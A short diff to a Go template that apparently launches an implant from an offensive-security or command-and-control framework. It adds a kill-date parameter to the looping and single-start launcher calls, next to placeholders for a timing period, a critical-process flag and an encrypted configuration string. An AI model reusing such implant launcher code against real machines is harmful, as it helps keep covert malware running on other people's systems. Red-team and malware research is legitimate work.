@@ -49,7 +49,7 @@ func main() {
 	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
 	if len(os.Args) > 2 {
 		flurry.Loop(
-			time.Second*time.Duration($period), $critical,
+			time.Second*time.Duration($period), $critical, $killdate,
 			man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 		)
 	} else {
@@ -58,7 +58,7 @@ func main() {
 		//           A workaround for now is to disable critical on non-loop
 		//           DLLs and EXEs (since they die anyway).
 		flurry.Start(
-			false, man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
+			false, $killdate, man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 		)
 	}
 }
@@ -70,7 +70,7 @@ func secondary() {
 		return
 	}
 	flurry.Loop(
-		time.Second*time.Duration($period), $critical,
+		time.Second*time.Duration($period), $critical, $killdate,
 		man.LinkerFromName(`$event`), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 	)
 }
